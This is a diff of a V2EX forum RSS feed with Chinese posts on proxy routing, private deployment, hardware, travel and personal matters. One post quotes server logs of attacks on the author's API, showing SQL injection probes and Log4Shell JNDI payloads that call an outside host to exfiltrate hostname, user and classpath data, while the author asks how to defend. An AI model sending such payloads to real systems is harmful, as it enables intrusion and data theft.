@@ -5,14 +5,202 @@
 <link>https://www.v2ex.com/</link>
 
 <item>
+<title>[问与答] 各位都是如何解决 jp 区， google 搜索 显示日文的。</title>
+<link>https://www.v2ex.com/t/1024489</link>
+<guid>https://www.v2ex.com/t/1024489</guid>
+<content:encoded><![CDATA[
+
+<p>RT ，</p>
+<p>先说下我的方案。</p>
+<p>开 2 个区的节点，一个是 jp ，不限流量的 ；另一个是 us ，限流量的。</p>
+<h4>具体实现细节</h4>
+<h5>网络流量架构</h5>
+<p>其他流量 -----&gt; jp</p>
+<p>google 搜索的流量 ----&gt;jp （ haproxy 中转下） ----&gt; us</p>
+<p>选择 jp 中转的原因是： 国内直连 300ms +，通过 jp 中转的延时是，国内到 jp 40ms + jp 到 us 100ms</p>
+<p>ps：为了加速，从 jp 到 us 流量可以直接裸奔。</p>
+<h5>本地通过 ipset 区分 流量。</h5>
+<pre><code># for jp
+iptables -t nat -I PREROUTING -p tcp -m set --match-set jp dst -m multiport --dports 80,443 -j REDIRECT --to-ports 1234
+
+# for us
+iptables -t nat -I PREROUTING -p tcp -m set --match-set us dst -m multiport --dports 80,443 -j REDIRECT --to-ports 1235
+
+</code></pre>
+<p>配合 dnsmasq</p>
+<h5>google 搜索的，通过中转到 us</h5>
+<pre><code>ipset=/google.com/us
+server=/google.com/127.0.0.1#5301
+
+</code></pre>
+<h5>其他的，走 jp</h5>
+<pre><code>ipset=/xx.com/jp
+server=/xx.com/127.0.0.1#5300
+
+</code></pre>
+<p>PS：
+从国内到 jp ，我用的是 ss over tls ，其他协议，也可以参考。</p>
+]]></content:encoded>
+<pubDate>2024-03-17T10:12:04Z</pubDate>
+<pubDate>2024-03-17T10:09:04Z</pubDate>
+</item>
+<item>
+<title>[DevOps] 私有化部署太难搞了</title>
+<link>https://www.v2ex.com/t/1024486</link>
+<guid>https://www.v2ex.com/t/1024486</guid>
+<content:encoded><![CDATA[
+
+<p>公司的项目是两周一迭代，中途有客户需要私有化部署的时候，我们会选用上个迭代更新到生产环境的版本，拉取镜像部署给客户。</p>
+<p>如何在项目（微服务）的快速迭代开发（两周一迭代）的情况下，保证私有化部署的稳定性？</p>
+<ul>
+<li>
+<p>项目在快速迭代的情况下，可能两周前的部署配置，在两周后就不适用了</p>
+</li>
+<li>
+<p>开发时只考虑了企业版的场景，没有考虑私有化部署的场景，一旦私有化部署之后发现没法用，又需要改代码</p>
+</li>
+<li>
+<p>部署时弄错了某些配置（私有化部署的时候，某个配置应该是要变一下... 云云）</p>
+</li>
+</ul>
+<p>有的企业会将系统做成镜像，到时候直接拷贝到机器里面，但是两周的迭代太快了，这种方法感觉不太现实....</p>
+]]></content:encoded>
+<pubDate>2024-03-17T09:47:36Z</pubDate>
+<pubDate>2024-03-17T09:46:36Z</pubDate>
+</item>
+<item>
+<title>[信息安全] 遇到黑客攻击了怎么办</title>
+<link>https://www.v2ex.com/t/1024484</link>
+<guid>https://www.v2ex.com/t/1024484</guid>
+<content:encoded><![CDATA[
+
+<p>我在做的是一个小程序，有后台的 API 服务。</p>
+<p>上周五突然发现有很多 SQL 注入和远程代码执行的调用。</p>
+<pre><code>Mar 15 16:48:15 lightsh ibkapi[1420640]: GET /products?q=%27%20union%20select%201--%20&amp;count=30&amp;cat=21&amp;p=1 500 2.012 ms - 60
+Mar 15 16:48:16 lightsh ibkapi[1420640]: GET /products?q=%25bf%2527%25bf%27%2527%2522%27%22%5C%5C%255C%250d%250a%2523%23&amp;count=30&amp;cat=21&amp;p=1 500 4.498 ms - 60
+Mar 15 16:48:16 lightsh ibkapi[1420640]: GET /products?q=%bf%27%bf'%27%22'"\\%5C%0d%0a%23%23&amp;count=30&amp;cat=21&amp;p=1 500 16.973 ms - 60
+Mar 15 16:49:27 lightsh ibkapi[1420640]: GET /products?q=&amp;count=30&amp;cat=21&amp;p=%20OR%20%28SELECT%2AFROM%28SELECT%28SLEEP%284%29%29%29iiet%29%20limit%201%23 400 0.847 ms - 163
+</code></pre>
+<p>和这样：</p>
+<pre><code>Mar 15 17:31:35 lightsh ibkapi[1457656]: GET /orders/?status=-1&amp;count=10&amp;p=${jndi:rmi://183.47.120.213:1099/bypass4ab2c832c1448624ddd652713f2b4b1b-/-${hostName}} 400 1.655 ms - 201
+Mar 15 17:31:35 lightsh ibkapi[1457656]: GET /orders/?status=-1&amp;count=10&amp;p=${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.f4a52b7ecb98e763293fb54f33f9bec8.4j2.mauu.mauu.me/} 400 1.722 ms - 258
+Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=-1&amp;count=10&amp;p=${jndi:ldap://183.47.120.213:1389/jdk185bf1616da873b6fb2299bbc60897c1c1-/-${hostName}} 400 1.749 ms - 201
+Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.05d82899be802b7b14abf20f5a33c934.4j2.mauu.mauu.me/}&amp;count=10&amp;p=1 400 2.063 ms - 257
+</code></pre>
+<p>还有今天发现在请求 <code>/.env</code>。</p>
+<p>技术战是 NodeJS+MySQL ，看起来这些攻击没有得逞，我也在发现的第一时间停掉服务规避了。</p>
+<p>然后修改了系统里校验参数和 SQL 语句的用法。</p>
+<p>目前有 2 个问题：</p>
+<ol>
+<li>这个站点我并没有公开发布过，黑客是怎么知道地址的呢？拿手机抓包获取 API 地址？</li>
+<li>大家有什么办法避免这样的攻击？</li>
+</ol>
+]]></content:encoded>
+<pubDate>2024-03-17T09:34:58Z</pubDate>
+<pubDate>2024-03-17T10:10:59Z</pubDate>
+</item>
+<item>
+<title>[问与答] 付费 500 求解决 ubuntu22（没有图形化界面）中搭建 crash 的问题</title>
+<link>https://www.v2ex.com/t/1024483</link>
+<guid>https://www.v2ex.com/t/1024483</guid>
+<content:encoded><![CDATA[
+
+目前是这样 使用的 shellCrash ，使用了一个海外的 vps 生成的订阅地址，然后 ping 这个地址就丢包很严重 30%多，但是使用本机 ping 或者服务器上停止 crash 服务 ping 就没问题丢包率很正常。<br /><br />所以是想求助解决 shellCrash 是为啥会出现这个问题，以及 除了 shellCrash 还有什么办法。 付费 500 元。 你可以留下你的 tg ，我的上一篇帖子中帮助我的人我给他发了 2000 多元红包，只要问题能解决 钱不是问题 🙏
+]]></content:encoded>
+<pubDate>2024-03-17T09:31:49Z</pubDate>
+<pubDate>2024-03-13T09:30:49Z</pubDate>
+</item>
+<item>
+<title>[分享创造] 大家喜欢收藏水杯吗？</title>
+<link>https://www.v2ex.com/t/1024482</link>
+<guid>https://www.v2ex.com/t/1024482</guid>
+<content:encoded><![CDATA[
+
+<p>大家喜欢水杯吗？
+为什么在商场看到好看的水杯特别想买下来收藏？
+是我一个人有这个冲动吗？</p>
+]]></content:encoded>
+<pubDate>2024-03-17T09:14:36Z</pubDate>
+<pubDate>2024-03-17T10:08:32Z</pubDate>
+</item>
+<item>
+<title>[程序员] 问下大家，有类似 ublacklist 的插件能屏蔽知乎答主吗？</title>
+<link>https://www.v2ex.com/t/1024481</link>
+<guid>https://www.v2ex.com/t/1024481</guid>
+<content:encoded><![CDATA[
+
+<p>发现很多技术相关的问题都被卖课的占领了，答非所问，强行回答，文章又臭又长，还一个个排在前面。请问有类似 ublacklist 这样的插件可以利用公共黑名单屏蔽掉这些人吗？</p>
+]]></content:encoded>
+<pubDate>2024-03-17T09:05:01Z</pubDate>
+<pubDate>2024-03-17T10:05:08Z</pubDate>
+</item>
+<item>
+<title>[Google] 是 google 搜索的问题还是我的问题？</title>
+<link>https://www.v2ex.com/t/1024480</link>
+<guid>https://www.v2ex.com/t/1024480</guid>
+<content:encoded><![CDATA[
+
+最近用谷歌搜索的时候经常看见一些色情广告，有没有人愿意试一下谷歌搜索关键词“蚂蚁财富 涨跌颜色”，看看结果有没有不良广告的？我试了下 google 和调用谷歌的 startpage 搜上面的关键词都出现了同样的约炮广告，为了清净不得不用 duckduckgo 了<br />startpage 结果： <a href="https://imgur.com/zJJX0fz" rel="nofollow noopener" target="_blank">https://imgur.com/zJJX0fz</a><br />google 结果： <a href="https://imgur.com/tfCzo8x" rel="nofollow noopener" target="_blank">https://imgur.com/tfCzo8x</a>
+]]></content:encoded>
+<pubDate>2024-03-17T08:58:47Z</pubDate>
+<pubDate>2024-03-17T09:55:24Z</pubDate>
+</item>
+<item>
+<title>[PayPal] 这是个什么玩意儿？这个应用我都不知道哪里下载。</title>
+<link>https://www.v2ex.com/t/1024479</link>
+<guid>https://www.v2ex.com/t/1024479</guid>
+<content:encoded><![CDATA[
+
+<p>我安装了客户端的，但是没看到哪里有提示我操作啥的
+<img alt="图片!" class="embedded_image" rel="noreferrer" src="http://51paypaldaifu.com/test/pp.png" title="San Juan Mountains" /></p>
+]]></content:encoded>
+<pubDate>2024-03-17T08:50:56Z</pubDate>
+<pubDate>2024-03-17T08:47:56Z</pubDate>
+</item>
+<item>
+<title>我一个人写了个小程序，做最好的 Midjourney 提示词生成器</title>
+<link>https://www.v2ex.com/t/1022037</link>
+<guid>https://www.v2ex.com/t/1022037</guid>
+<content:encoded><![CDATA[
+
+<p>这段时间写了个微信小程序，先放二维码：</p>
+<p><img alt="二维码图片" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/yoQMuHqf.jpeg" /></p>
+<h2>产品定位</h2>
+<p>我就是之前发帖主张程序员要自己做产品的那个人（<a href="https://www.v2ex.com/t/948294" rel="nofollow">相关帖子</a>）。</p>
+<p>这个小程序的功能就一个：生成 Midjourney 提示词。你需要配合 Midjourney 软件使用。</p>
+<p>对于不会使用 Midjourney 软件的人，你用这个小程序就不需要学习 Midjourney 了，点击下面的“复制 prompt”就能得到绘画提示词。</p>
+<p><strong>如果你想帮身边没有 Midjourney 的朋友画画，可把小程序发给他，他生成 prompt 后发给你。</strong></p>
+<h2>提示词模板</h2>
+<p>过年期间我用 Midjourney 画了一万来张图片，对了，我还去摆摊了（<a href="https://www.v2ex.com/t/1015260" rel="nofollow">相关帖子</a>），摆了 8 天（冷死）。</p>
+<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/78L7Zf1qb.jpeg" /></p>
+<p>我从一万张图片中选出了 5000 多张，生成了 5000 多个模板（这个工作超级累，花了我 30 多天，远超预期）。</p>
+<p>原本是准备把模板功能写好后再发布的，结果前几天我接了个微信小程序外包项目，所以我要先去帮客户做外包了，模板功能就等到下一个版本再更新了。</p>
+<h2>设计</h2>
+<p><strong>我不但主张程序员应该自己做产品，我还主张程序员要会做设计</strong>（如果有设计师合作当然好，但没有设计师的时候要能自己搞定）。</p>
+<p>以前我都是和设计师合作，拿别人做好的设计照着写。本来这个小程序也是找设计师合作的，结果人家说“最近几天比较忙，要等一段时间”，我觉得这样很不科学，就决定自己学设计了（这个小程序是我第一次做设计）。</p>
+<p>我先学习了 Figma 软件，然后在 Figma 社区找了个模板，在模板的基础上设计。</p>
+<p>根据我自己的经验，如果你会前端开发，学会做设计并不难，你可以像我一样先找一个模板，在模板的基础上慢慢来，有一个成功案例你就有信心了。</p>
+<h2>前后端、云开发</h2>
+<p>前端没有使用任何 html 、css 框架，都是自己手写的，我记得那个 参考图权重的拖动条 花了我最多时间。其他主要是抠细节花时间比较多，例如一两个像素的反复调整，看得我眼睛都痛了。</p>
+<p>后端使用微信云开发，没有服务器，虽然我一直在吐槽微信云开发坑太多了（真的很多），文档也不齐全，不过好在遇到问题可以发工单，腾讯客服会及时回复。</p>
+<p>用了云开发后，这种 “<strong>写完就完事了，不需要维护服务器</strong>” 的感觉太好了，基本上是回不去了。想着以前出门旅游还要带着笔记本，生怕服务器挂了客户打电话过来，现在打死我也不愿意回到维护服务器的状态了。</p>
+<p>对了，提醒一下，如果小程序的用户比较多，云开发相比自己购买服务器要贵得多！贵得多！贵得多！（十倍以上，甚至百倍）</p>
+<h2>意见和反馈</h2>
+<p>如果你在使用过程中遇到 Bug ，可以先拖动小程序到垃圾桶，重新扫码打开。</p>
+<p>欢迎大家在这里反馈 Bug 或提出你的建议，我今天会尽可能地回复。</p>
+<p><img alt="二维码图片" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/yoQMuHqf.jpeg" /></p>
+]]></content:encoded>
+<pubDate>2024-03-09T02:49:00Z</pubDate>
+<pubDate>2024-03-15T08:42:23Z</pubDate>
+</item>
+
+<item>
 <title>[OpenAI] Github Copilot 可以直接访问了？</title>
 <link>https://www.v2ex.com/t/1024475</link>
 <guid>https://www.v2ex.com/t/1024475</guid>
 <content:encoded><![CDATA[
-
 <p>测试了下，不用梯子，可以直接访问, 可以作为 GPT 来使用了，虽然差点意思。</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T08:19:10Z</pubDate>
 <pubDate>2024-03-17T08:19:10Z</pubDate>
 </item>
 <item>
@@ -20,10 +208,8 @@
 <link>https://www.v2ex.com/t/1024473</link>
 <guid>https://www.v2ex.com/t/1024473</guid>
 <content:encoded><![CDATA[
-
 功耗无所谓<br />cpu 核数多点就行 我主机同时充当 k8s master 进程比较多<br />内存 ddr5 64G*2 <br />主板要能支持 256G 内存的 要支持多个 m.2 nvme 固态 最好 4 个以上<br />硬盘我自己选好了致钛 T7100 4T*2<br />显卡 32 或 48G n 卡 主板要支持双显卡 以后可能要加<br /><br />主要开发大模型推理 偶尔做训练 我在 jd 挑了好久感觉都不太好,来个懂哥推荐推荐啊
 ]]></content:encoded>
-<pubDate>2024-03-17T08:14:14Z</pubDate>
 <pubDate>2024-03-09T08:14:14Z</pubDate>
 </item>
 <item>
@@ -31,11 +217,9 @@
 <link>https://www.v2ex.com/t/1024472</link>
 <guid>https://www.v2ex.com/t/1024472</guid>
 <content:encoded><![CDATA[
-
 <p>之前买来给家里人刷剧的，他们用了一年不习惯又给我用了</p>
 <p>我用了一段时间感觉这续航真心尿崩，看一个小时直播大概能掉 30%的电，这未免太离谱了…… 1 年时间电池也不可能衰减到这个地步吧。还是说大屏幕和 M1 的功耗太高了，7 、8000mAh 的电池也扛不住？</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T08:11:07Z</pubDate>
 <pubDate>2024-03-17T08:17:49Z</pubDate>
 </item>
 <item>
@@ -43,13 +227,11 @@
 <link>https://www.v2ex.com/t/1024471</link>
 <guid>https://www.v2ex.com/t/1024471</guid>
 <content:encoded><![CDATA[
-
 <p>1 、想从大陆号码更换手机号为香港手机号，提示手机号被其他人绑定，应该是被人用过注册了的。
 2 、尝试用该香港手机号登录微信，提示新设备需要用旧设备扫码或邀请朋友验证，问题是之前这个号也不是我的呀，这步一直无法通过。
 3 、尝试申诉香港号码注册的微信号，目的是把这个号注销了或解绑手机号了，这样我的大陆微信才能换绑上去，但是申诉需要提交微信号、身份证号等信息，这个也无解。</p>
 <p>所以大家有什么方法吗？</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T08:09:37Z</pubDate>
 <pubDate>2024-03-17T08:13:55Z</pubDate>
 </item>
 <item>
@@ -58,9 +240,7 @@
 <guid>https://www.v2ex.com/t/1024470</guid>
 <content:encoded><![CDATA[
 
-
 ]]></content:encoded>
-<pubDate>2024-03-17T08:08:21Z</pubDate>
 <pubDate>2024-03-17T08:05:21Z</pubDate>
 </item>
 <item>
@@ -68,7 +248,6 @@
 <link>https://www.v2ex.com/t/1024469</link>
 <guid>https://www.v2ex.com/t/1024469</guid>
 <content:encoded><![CDATA[
-
 <p>背景：PHP 在传统公司干内部 OA 一年了，现在 CTO 要求全员转 JAVA
 现公司
 优点：有内部转 Java 机会，公司不会倒闭
@@ -77,7 +256,6 @@
 优点：居家办公 965
 缺点：24 小时 on call,擦边球行业容易被抓</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T08:07:32Z</pubDate>
 <pubDate>2024-03-17T08:18:58Z</pubDate>
 </item>
 <item>
@@ -85,7 +263,6 @@
 <link>https://www.v2ex.com/t/1024468</link>
 <guid>https://www.v2ex.com/t/1024468</guid>
 <content:encoded><![CDATA[
-
 <ul>
 <li>校招内推： <a href="https://jobs.mihoyo.com/?isRecommendation=true&amp;recommendationCode=GMD5Q#/campus/position" rel="nofollow">https://jobs.mihoyo.com/?isRecommendation=true&amp;recommendationCode=GMD5Q#/campus/position</a></li>
 <li>社招内推： <a href="https://jobs.mihoyo.com/?isRecommendation=true&amp;recommendationCode=NTA1AfQ#/position" rel="nofollow">https://jobs.mihoyo.com/?isRecommendation=true&amp;recommendationCode=NTA1AfQ#/position</a></li>
@@ -93,17 +270,14 @@
 </ul>
 ]]></content:encoded>
 <pubDate>2024-03-17T08:05:38Z</pubDate>
-<pubDate>2024-03-17T08:05:38Z</pubDate>
 </item>
 <item>
 <title>[MacBook Pro] mac 端如何看 netflix？</title>
 <link>https://www.v2ex.com/t/1024467</link>
 <guid>https://www.v2ex.com/t/1024467</guid>
 <content:encoded><![CDATA[
-
 <p>没有找到 mac 端的 netflix 客户端，想来请教一下各位</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T07:48:57Z</pubDate>
 <pubDate>2024-03-17T08:07:32Z</pubDate>
 </item>
 <item>
@@ -111,13 +285,11 @@
 <link>https://www.v2ex.com/t/1024466</link>
 <guid>https://www.v2ex.com/t/1024466</guid>
 <content:encoded><![CDATA[
-
 <p>未来我可能手头会有很多的 Linux 设备，但是他们都并非企业级产品，没有 BMC 或者 IMPI</p>
 <p>我需要一个平台化的产品，可以通过在从机里安装 Agent 的方式统一集中管理所有的设备，监控状态，下发 SSH 命令，以及各种 root 级别的运维操作。</p>
 <p>目的是摆脱在各种机器之间登录来登录去的繁琐操作，在一个网站就能搞定管理</p>
 <p>目前在用一款叫做 <a href="https://www.netdata.cloud/" rel="nofollow">netdata</a> 的产品，但是这款产品只能够监控和告警，不能进行操作和运维</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T07:46:45Z</pubDate>
 <pubDate>2024-03-17T08:12:59Z</pubDate>
 </item>
 <item>
@@ -125,10 +297,8 @@
 <link>https://www.v2ex.com/t/1024465</link>
 <guid>https://www.v2ex.com/t/1024465</guid>
 <content:encoded><![CDATA[
-
 3 月初， 我们发布了 Artiversehub 的 v1.0 版本， 支持使用 DALLE2&amp;DALLE3&amp;LeonardoAI&amp;StabilityAI 等模型的生图功能， 我们希望通过这种聚合工具给用户带来一站式的生图便利性体验。 在 v1.0 发布对外后， 我们发现了产品的很多不足， 主要如下：<br />1. 生图在不同模型可能会出现耗时， 导致我们的生图后，图片没有在前端正常展示；<br />2. 工具中提供了不少精选的图片， 但是因为处理不够完善， 没有给用户提供生图的参考 Prompt ， 没有体现生图的便利性。<br />所以新版本， 我们针对上面的问题， 做了不少的调整， 主要优化点如下：<br />1. 生图的技术实现， 采用异步方式， 轮询去确认生图的结果， 避免生图后图片展示异常问题；<br />2. 首页的图片添加了模型内容、生图 Prompt 及一键复制生图的快捷入口， 进一步降低生图的门槛；<br />3. 添加了 ai-wallpaper 模块， 让对壁纸有需求的用户， 可以在我们工具里面找到合适的壁纸， 也可以参考我们提供的 Prompt 去生成属于自己的壁纸；<br />4. 我们对新用户提供了免费体验的入口， 首次注册会提供生图的代币， 方便用户体验我们的工具。<br />我们的工具地址： <a href="https://artiversehub.ai/" rel="nofollow noopener" target="_blank">https://artiversehub.ai/</a>, 欢迎大家体验， 并提供反馈。
 ]]></content:encoded>
-<pubDate>2024-03-17T07:44:23Z</pubDate>
 <pubDate>2024-03-17T07:41:23Z</pubDate>
 </item>
 <item>
@@ -136,10 +306,8 @@
 <link>https://www.v2ex.com/t/1024464</link>
 <guid>https://www.v2ex.com/t/1024464</guid>
 <content:encoded><![CDATA[
-
 用了好几条宽带，每一条宽带一个猫，太烦了，求多光口光猫，将所有宽带的光纤都插上去的，然后再桥接到一个路由器拨号
 ]]></content:encoded>
-<pubDate>2024-03-17T07:40:16Z</pubDate>
 <pubDate>2024-03-17T08:00:40Z</pubDate>
 </item>
 <item>
@@ -147,14 +315,12 @@
 <link>https://www.v2ex.com/t/1024463</link>
 <guid>https://www.v2ex.com/t/1024463</guid>
 <content:encoded><![CDATA[
-
 <p>最近抽空想带家里的老人去 Beijing 玩两天，老人已经 80 岁以上（这应该是他这辈子唯一一次了），能走动（可能走个几公里就得歇一下，我也已经给他买了折叠椅）。目前正在努力做攻略（做准备工作，预约等相关事宜），想请问下在 Beijing 或者有过相关旅游经历的大佬几个问题：</p>
 <p>1 、tian an 门升旗、毛 ze dong 纪念馆、国 jia 博物馆、故宫博物院这几个挨着的能不能安排在一天之内（预约在同一天）？以及这几个之间有没有比较好游览顺序（最优路线，尽量少走让老人少遭点罪）？或者相关场所有没有类似于可以直接租借轮椅等服务？</p>
 <p>2 、除了上面几个景点以及八达岭长城外还有没有适合老年人去游览的景点？</p>
 <p>3 、关于上述旅游景点及整个旅游行程上有没有什么特别注意事项？</p>
 <p>鉴于本人也是第一次去 Beijing ，希望了解的大佬分享下经验。</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T07:38:32Z</pubDate>
 <pubDate>2024-03-17T07:35:32Z</pubDate>
 </item>
 <item>
@@ -162,7 +328,6 @@
 <link>https://www.v2ex.com/t/1024462</link>
 <guid>https://www.v2ex.com/t/1024462</guid>
 <content:encoded><![CDATA[
-
 <p>前言:结束了长达 9 年的程序员生涯，我选择回到小地方重新开始，一切都那么的不一样，那么的充满挑战，同样充满机遇
 ，我准备好迎接现实的磨难了。</p>
 <p>关注我的人知道我之前发帖卖红牛来着，本来跟供货商(其实应该是个代理)谈好 45 一箱，我一分钱不赚卖给论坛的朋友，好多朋友也加我微信了。结果后来谈崩了，对方要 87 一箱，感觉挺对不起论坛的朋友，说好搞 45 一箱结果事没办成。这世道感觉人为刀俎，我始终都是为鱼肉。遂这件事就不了了之，但事情还没结束…</p>
@@ -170,7 +335,6 @@
 <p>之前准备给大家搞的红牛没有搞到，有点对不起大家的期待。但我并没有放弃这个方向，就像我上面说的事情并没有结束，最近就准备出发去找货源了，这次我要找的不光是红牛了，各种食品零食水果酒水我都会去找，并且我会自己亲自试用，保证质量没问题才会采购。想必大家也不难看出我是把这当我的主业来做的，并不是开玩笑。老实说我不太想来这里说这些，因为我回来小县城能明显感觉到我们程序员圈子的人都太直了，容易同感，容易被骗，但是作为曾经的程序员的我自己干事业，第一想到的还是找我们程序员作为第一批用户，这可能是个惯性思维吧。我知道这里面的坑绝对比做彩票坑多得多，难度大的多得多，但我还是决定尝试一下，毕竟我得调试自己的人生。
 最后也希望各位吐槽温柔点，毕竟我还没开始做，别打击的太狠😂，也祝各位能技术进步，多多赚钱，有像我这种的也能顺利转型。最后的最后还是得打个广告，加我微信😁:lingqiyouyue</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T07:38:20Z</pubDate>
 <pubDate>2024-03-17T03:37:20Z</pubDate>
 </item>
 <item>
@@ -178,10 +342,8 @@
 <link>https://www.v2ex.com/t/1024460</link>
 <guid>https://www.v2ex.com/t/1024460</guid>
 <content:encoded><![CDATA[
-
 如题 最近要找外包，结果找了好几个，都是先问我什么预算。<br />感觉报太高亏的慌 太低又没人接(还怕被挂)<br />好奇经验丰富的 v 友们，报价原则是什么？如何量化？
 ]]></content:encoded>
-<pubDate>2024-03-17T07:18:15Z</pubDate>
 <pubDate>2024-03-17T08:14:00Z</pubDate>
 </item>
 <item>
@@ -189,7 +351,6 @@
 <link>https://www.v2ex.com/t/1024459</link>
 <guid>https://www.v2ex.com/t/1024459</guid>
 <content:encoded><![CDATA[
-
 <p>去年年初在小区楼下理发店办了会员.<br />
 农历年前他们放假了一个月.<br />
 农历正月不适合剪头发没去.<br />
@@ -204,7 +365,6 @@
 要看它营业执照, 说我耽误他做生意,很生气呵斥我, 说不信任他了.</p>
 <p>这种情况, 大家怎么办?</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T07:15:19Z</pubDate>
 <pubDate>2024-03-17T08:16:39Z</pubDate>
 </item>
 <item>
@@ -213,9 +373,7 @@
 <guid>https://www.v2ex.com/t/1024458</guid>
 <content:encoded><![CDATA[
 
-
 ]]></content:encoded>
-<pubDate>2024-03-17T07:01:54Z</pubDate>
 <pubDate>2024-03-17T06:58:54Z</pubDate>
 </item>
 <item>
@@ -223,10 +381,8 @@
 <link>https://www.v2ex.com/t/1024457</link>
 <guid>https://www.v2ex.com/t/1024457</guid>
 <content:encoded><![CDATA[
-
 1.通过国内 vps 采用 vpn 结构，实现多点组建内网不同设备互访是违规的吧？云厂家的用户协议里也都注明了不能部署常见的科学协议。<br />2.国内 vps 没法正常访问 github ，op wg 这类工具好像都不能在线安装。
 ]]></content:encoded>
-<pubDate>2024-03-17T06:52:11Z</pubDate>
 <pubDate>2024-03-17T07:49:42Z</pubDate>
 </item>
 <item>
@@ -234,10 +390,8 @@
 <link>https://www.v2ex.com/t/1024456</link>
 <guid>https://www.v2ex.com/t/1024456</guid>
 <content:encoded><![CDATA[
-
 母亲体检查出了甲状腺结节，4b 。<br /><br />目前医生让先观察，定期复查。先不做手术。<br /><br />有懂得朋友吗？给点建议，谢谢
 ]]></content:encoded>
-<pubDate>2024-03-17T06:42:27Z</pubDate>
 <pubDate>2024-03-17T04:41:27Z</pubDate>
 </item>
 <item>
@@ -245,10 +399,8 @@
 <link>https://www.v2ex.com/t/1024455</link>
 <guid>https://www.v2ex.com/t/1024455</guid>
 <content:encoded><![CDATA[
-
 <p>我们认识八年，大大小小几乎遇到所有问题都是他帮我解决的，每年互送礼物感觉七七八八送的也差不多了，以前一直送高达、游戏机、一些外设等等。下个月就到他生日了，我其实想送一个比较能戳中程序员身份的礼物，因为他很喜欢鼓捣这些，但我不懂。听说 V2EX 的使用者大多也都是程序员朋友，所以来注册想问一问大家喜欢收到什么样的礼物呀？预算 3-5k 。谢谢！</p>
 ]]></content:encoded>
-<pubDate>2024-03-17T06:41:57Z</pubDate>
 <pubDate>2024-03-17T02:41:57Z</pubDate>
 </item>
 <item>
@@ -256,10 +408,8 @@
 <link>https://www.v2ex.com/t/1024454</link>
 <guid>https://www.v2ex.com/t/1024454</guid>
 <content:encoded><![CDATA[
-
 毕业快两年了，春节回家父母开始给压力希望找女朋友。昨晚给父母开视频，父亲说最近房价降了不少，希望能尽快给房子的事定下来。<br /><br />其实从我上大二开始，父亲就有意无意地提及这事，当时因为疫情的事搁置了下来，我很能理解他，老来得子，年近六旬，希望尽快交差，希望看到儿子的生活稳定下来。但是这事对我来说其实挺难受的，父母手上大概有 50w ，是他们毕生卖苦力、省吃俭用，将女儿和儿子送往大学之后留下来的积蓄，这笔钱对我们来说很多，但是对于我工作的二线城市来说，也许勉强可以上车，但是地段不会太好，之后还贷款的压力会比较大，这是明面上我跟父亲说的理由。心里面我是很排斥拿家里面人的血汗钱来上车的，父母没有退休金，拿棺材本来给我买房的话，我家的抗风险能力可以说为 0 了。但是看着父母日渐衰老，银行那点可怜的利息也在侵蚀他们这几十年的劳动成果，我不愿意给自己上压力，不愿意拿父母钱那点可怜的自尊，是否也是一种自私？<br /><br />再说说我自己的情况。毕业后进入一家不错的公司拿着尚为客观的收入，但是工作几个月后觉得压力比较大选择了大降薪换工作，现在到手大概 10k 多点,我不怎么花钱，本来也攒了点钱，不过去年 a 股币圈被割了两轮出血了一波。个人对于结婚不报期望也不排斥，得之我幸不得我命，但是偶尔想到父母在未来的二十年可能就会离开我，如果那时还是一个人的话，世界上就真的只有一个人了，一股气就哽咽在咽喉。总之挺拧巴一个人。<br /><br />发小家叔叔阿姨才四十多，发小大学毕业后，叔叔拍着肚子说我的责任尽完了，转头给自己换了辆新车。如果我的父母能像他一样自私一点，对自己好一点，没那么爱自己的小孩，我的幸福感会不会强一点呢
 ]]></content:encoded>
-<pubDate>2024-03-17T06:35:37Z</pubDate>
 <pubDate>2024-03-17T07:58:38Z</pubDate>
 </item>
 <item>
@@ -267,7 +417,6 @@
 <link>https://www.v2ex.com/t/1024453</link>
 <guid>https://www.v2ex.com/t/1024453</guid>
 <content:encoded><![CDATA[
-
 <p>(470) 333-2252</p>
 <p>(984) 666-3383</p>
 <p>(571) 666-4424</p>
@@ -281,10 +430,8 @@
 上货提醒：<a href="https://t.me/Didishan_ch" rel="nofollow">点击关注上货提醒</a>
 售后群租:<a href="https://t.me/+iYM8FxkXLPcyNWM1" rel="nofollow">每日抽奖不停，欢迎加入</a></p>
 ]]></content:encoded>
-<pubDate>2024-03-17T06:21:04Z</pubDate>
 <pubDate>2024-03-17T07:52:12Z</pubDate>
 </item>
-
 <item>
 <title>[生活] 新房装修，有什么比较经济的方式来做信号屏蔽吗？</title>
 <link>https://www.v2ex.com/t/1024452</link>
@@ -15046,265 +15193,6 @@ mac 140</p>
 <p>大家随意发挥一下。</p>
 ]]></content:encoded>
 <pubDate>2024-03-13T08:05:36Z</pubDate>
-</item>
-<item>
-<title>[程序员] 有团队声称他们创造了首个 AI 软件工程师</title>
-<link>https://www.v2ex.com/t/1023241</link>
-<guid>https://www.v2ex.com/t/1023241</guid>
-<content:encoded><![CDATA[
-<p><a href="https://www.cognition-labs.com/blog" rel="nofollow">https://www.cognition-labs.com/blog</a></p>
-<p>这网站有点简陋，公布的大多是视频，没有什么可以直接试用的 demo ，实际情况有点真假难辨，各位老哥们怎么看？</p>
-<p>目前阶段，感觉 AI 技术虽然正在突飞猛进，但是直接公布说已经可以让 AI 自己开发软件，感觉还是有点匪夷所思。</p>
-]]></content:encoded>
-<pubDate>2024-03-13T07:27:53Z</pubDate>
-</item>
-<item>
-<title>[推广] T 楼！ T 楼！ 每一百层送两个 Xterminal 年会员</title>
-<link>https://www.v2ex.com/t/1023239</link>
-<guid>https://www.v2ex.com/t/1023239</guid>
-<content:encoded><![CDATA[
-<p>回馈一下 v2 论坛初期的用户支持，开启一下踢楼送会员，如果大家喜欢，可以不定期举行</p>
